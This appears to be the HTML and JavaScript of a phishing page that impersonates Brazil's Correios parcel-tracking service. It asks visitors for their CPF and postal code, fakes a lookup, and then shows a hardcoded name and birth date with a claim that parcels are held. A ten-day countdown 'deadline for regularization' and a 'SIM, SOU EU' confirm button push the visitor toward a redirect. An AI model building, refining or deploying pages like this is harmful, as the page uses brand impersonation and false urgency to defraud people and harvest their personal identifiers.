<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  <link rel="stylesheet" href="css/bootstrap.css" />
  <link rel="stylesheet" href="css/app.css" />
  <link rel="stylesheet" href="css/yellow.css" />
  <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png" />
  <script src="../scripts/utms/latest.js" async defer></script>
  <title>Correios | Rastreio</title>

  <style>
    /* Anima√ß√£o Bot√£o */
    @keyframes pulsar {
      0% { transform: scale(1); }
      50% { transform: scale(1.1); }
      100% { transform: scale(1); }
    }
    #consultar-btn { animation: pulsar 1s infinite; }

    /* Spinner */
    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid rgba(0, 0, 0, 0.1);
      border-top-color: #007bff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    #res-prazo {
      color: red;
      text-align: center;
      font-weight: bold;
      display: block;
      margin: 15px 0;
      font-size: 1.2rem;
    }
    #confirmar-btn {
      display: block;
      margin: 20px auto;
    }
  </style>
</head>

<body>

  <!-- [Header e Main mant√©m igual o seu] -->

  <main>
    <!-- Tela Formul√°rio -->
    <!-- (mant√©m igual o seu formul√°rio original) -->

    <!-- Tela Resultado -->
    <section id="resultado" style="display: none;">
      <h2>Encontramos pedidos retidos em uma de nossas ag√™ncias. üì¶</h2>
      <p><span>Nome:</span> <span id="res-nome"></span></p>
      <p><span>CPF:</span> <span id="res-cpf"></span></p>
      <p><span>Nascimento:</span> <span id="res-nascimento"></span></p>
      <p><span>CEP:</span> <span id="res-cep"></span></p>
      <p><span>Rua:</span> <span id="res-rua"></span></p>
      <p><span>Bairro:</span> <span id="res-bairro"></span></p>
      <p><span>Cidade:</span> <span id="res-cidade"></span></p>
      <p><span>Estado:</span> <span id="res-estado"></span></p>
      <p><span>Prazo para Regulariza√ß√£o:</span> <span id="res-prazo"></span></p>
      <button id="confirmar-btn" class="btn btn-primary">SIM, SOU EU</button>
    </section>

    <section class="my-4 w-95 max-w-1000" style="margin: 0 auto;">
      <div>
        <img src="images/banner-1.jpg" alt="" class="w-100" />
      </div>
    </section>
  </main>

  <!-- Footer igual o seu -->

  <script>
    function formatarCPF(cpf) {
      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    }

    function formatarCEP(cep) {
      return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
    }

    function calcularPrazoData(dias, horas, minutos) {
      const prazo = new Date();
      prazo.setDate(prazo.getDate() + dias);
      prazo.setHours(horas);
      prazo.setMinutes(minutos);
      prazo.setSeconds(0);
      return prazo;
    }

    function atualizarContagemRegressiva(dataLimite) {
      const intervalo = setInterval(() => {
        const agora = new Date();
        const diff = dataLimite - agora;

        if (diff <= 0) {
          document.getElementById("res-prazo").textContent = "Prazo expirado!";
          clearInterval(intervalo);
          return;
        }

        const dias = Math.floor(diff / (1000 * 60 * 60 * 24));
        const horas = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutos = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        const segundos = Math.floor((diff % (1000 * 60)) / 1000);

        document.getElementById("res-prazo").textContent =
          `${dias}d ${horas}h ${minutos}m ${segundos}s restantes`;
      }, 1000);
    }

    document.getElementById("form-rastreamento").addEventListener("submit", async function (event) {
      event.preventDefault();

      const cpfRaw = document.getElementById("cpf").value.replace(/\D/g, "");
      const cepRaw = document.getElementById("cep").value.replace(/\D/g, "");

      if (!cpfRaw || cpfRaw.length !== 11) {
        alert("Por favor, insira um CPF v√°lido.");
        return;
      }
      if (!cepRaw || cepRaw.length !== 8) {
        alert("Por favor, insira um CEP v√°lido.");
        return;
      }

      document.getElementById("botao-container").style.display = "none";
      document.getElementById("loading-container").style.display = "block";

      await new Promise((resolve) => setTimeout(resolve, 2000));

      const dataLimite = calcularPrazoData(10, 23, 59);

      document.getElementById("res-nome").textContent = "Rosiane Oliveira Da Silva";
      document.getElementById("res-cpf").textContent = formatarCPF(cpfRaw);
      document.getElementById("res-nascimento").textContent = "27/01/1985";
      document.getElementById("res-cep").textContent = formatarCEP(cepRaw);
      document.getElementById("res-rua").textContent = "";
      document.getElementById("res-bairro").textContent = "";
      document.getElementById("res-cidade").textContent = "Porci√∫ncula";
      document.getElementById("res-estado").textContent = "RJ";

      atualizarContagemRegressiva(dataLimite);

      document.getElementById("loading-container").style.display = "none";
      document.getElementById("tela-formulario").style.display = "none";
      document.getElementById("resultado").style.display = "block";
    });

    document.getElementById("confirmar-btn").addEventListener("click", function () {
      alert("Confirma√ß√£o recebida! Em breve voc√™ ser√° redirecionado.");
    });
  </script>
</body>

</html>
